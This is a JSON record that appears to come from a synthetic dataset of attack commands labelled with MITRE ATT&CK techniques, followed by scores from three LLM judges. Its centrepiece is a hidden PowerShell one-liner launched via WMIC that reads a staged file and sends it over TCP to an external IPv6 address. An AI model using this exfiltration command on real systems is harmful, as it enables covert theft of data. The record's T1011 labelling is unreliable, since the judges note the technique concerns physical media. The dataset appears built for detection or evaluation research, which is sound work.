{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Uses WMIC to execute PowerShell that binds to an ISATAP IPv6 interface, then exfiltrates data over IPv6 to a non-standard port. This leverages an IPv6 transition mechanism as an alternate network medium per T1011.",
  "rationale_steps": [
    "Discover ISATAP adapter and collect an IPv6 address.",
    "Bind an IPv6 TCP client to the ISATAP address.",
    "Connect to an external IPv6 endpoint over a high port.",
    "Send file contents using the ISATAP path, distinct from the primary channel.",
    "Avoid permanent system configuration changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-27222a53",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 2,
        "syntactic_justification": "Although quoting and structure are mostly balanced, pervasive use of backticks before PowerShell variables (e.g., `$_, `$ifc) will escape the $ and likely break parsing/execution.",
        "semantic_score": 2,
        "semantic_justification": "The command plausibly attempts IPv6 TCP exfiltration via WMIC/PowerShell, but it does not use a physical medium as defined by T1011, making the technique mapping misaligned.",
        "combined_score": 2.0,
        "confidence": 0.68,
        "timestamp": "2025-10-01T09:56:04.581527Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax including variable declarations, method calls, and pipeline operations.",
        "semantic_score": 3,
        "semantic_justification": "While the command attempts to exfiltrate data over IPv6, it doesn't align with T1011 (Exfiltration Over Physical Medium) as it uses network communication rather than physical media like USB drives or SD cards.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T09:56:07.439767Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 2,
        "syntactic_justification": "The PowerShell variables (`$ifc`, `$_`, `$ip6`, etc.) are incorrectly escaped with backticks (` `) within the string passed to `powershell -Command`, which will cause PowerShell to fail parsing the script.",
        "semantic_score": 1,
        "semantic_justification": "The command describes data exfiltration over a network medium (IPv6), which fundamentally contradicts the MITRE ATT&CK T1011 technique \"Exfiltration Over Physical Medium\" which refers to physical data transfer via removable media.",
        "combined_score": 1.5,
        "confidence": 1,
        "timestamp": "2025-10-01T09:56:31.218593Z"
      }
    ],
    "llm_average_syntactic": 3.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 2.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
